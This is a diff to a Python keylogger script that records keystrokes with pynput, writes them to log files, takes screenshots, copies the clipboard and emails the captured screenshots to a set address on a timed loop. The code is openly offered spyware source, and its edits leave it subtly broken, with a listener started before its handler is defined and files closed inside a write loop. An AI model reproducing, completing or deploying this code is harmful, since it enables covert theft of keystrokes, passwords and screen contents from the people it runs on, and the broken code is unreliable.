@@ -31,11 +31,6 @@ system_information = "system file"
 clipboard_information = "clipboard.txt"
 audio_information = "audios.wav"
 screenshot_information = "screenshot.png"
-
-keys_information_e = "e_log.txt"
-system_information_e = "e_system file"
-clipboard_information_e = "e_clipboard.txt"
-
 microphone_time = 10
 time_iteration = 15
 number_of_iterations_end = 3
@@ -179,11 +174,8 @@ from pynput.keyboard import Key, Listener
 
 from pynput.keyboard import Key
 import pynput
-
 count = 0
 keys = []
-
-
 def on_press(key):
         global keys, count,currentTime
 
@@ -195,43 +187,28 @@ def on_press(key):
             count = 0
             write_file(keys)
             keys = []
-
-
 def write_file(keys):
         with open("log.txt", "a") as f:
             for key in keys:
                 f.write(str(key))
                 f.close()
-
-
+with Listener(on_press=on_press, on_release=on_release) as listener:
+            listener.join()
 def on_release(key):
         if key == Key.esc:
             return False
         if currentTime > stoppingTime:
-            return False
-
-
-        if currentTime > stoppingTime:
-         with open(file_path + extend + keys_information, "w") as f:
-            f.write(" ")
-
-         screenshot()
-
-         with Listener(on_press=on_press, on_release=on_release) as listener:
-            listener.join()
-
-         if currentTime > stoppingTime:
+            
           with open(file_path + extend + keys_information, "w") as f:
-            f.write(" ")
+              f.write(" ")
 
-        screenshot()
-        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
+          screenshot()
+          send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
+          copy_clipboard()
+          number_of_iterations += 1
+          currentTime = time.time()  #reset time for the next session
+          stoppingTime = time.time() + time_iteration
+          return False
 
-        copy_clipboard()
-
-        number_of_iterations += 1
-
-        currentTime = time.time()
-        stoppingTime = time.time() + time_iteration
 
 
